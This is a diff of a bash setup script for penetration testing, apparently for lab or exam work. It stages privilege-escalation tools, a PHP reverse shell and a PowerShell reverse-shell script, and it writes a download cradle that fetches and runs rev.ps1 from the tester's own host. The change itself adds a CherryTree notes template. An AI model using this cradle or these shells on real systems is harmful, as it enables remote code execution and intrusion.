@@ -2,7 +2,7 @@
 
 echo "Enter the target IP Address : "
 read target_ip
-mkdir -p nmap www exploit research autorecon
+mkdir -p nmap www exploit research autorecon templates
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 www
 cp /usr/share/seclists/Web-Shells/laudanum-1.0/php/php_reverse_shell_perfect.php www
 cp /opt/priv/winpeas/winPEASany.exe www
@@ -27,4 +27,14 @@ if [ ! -e notes.md ]; then
     cp www/Invoke-PowerShellTcp.ps1 www/rev.ps1
     echo "IEX(New-Object Net.Webclient).DownloadString(\"http://${ip_tun0}:8000/rev.ps1\")" >> www/cradle
     subl $(pwd)
+fi
+
+TEMPLATE_PATH=/home/kali/Desktop/_templates/template.ctd
+CT_FILE=templates/notes.ctd
+
+if [ -f "$TEMPLATE_PATH" ]; then
+    cp "$TEMPLATE_PATH" "$CT_FILE"
+    setsid cherrytree -S "$CT_FILE" > /dev/null 2>&1 < /dev/null &
+else
+    echo "Template not found at $TEMPLATE_PATH"
 fi
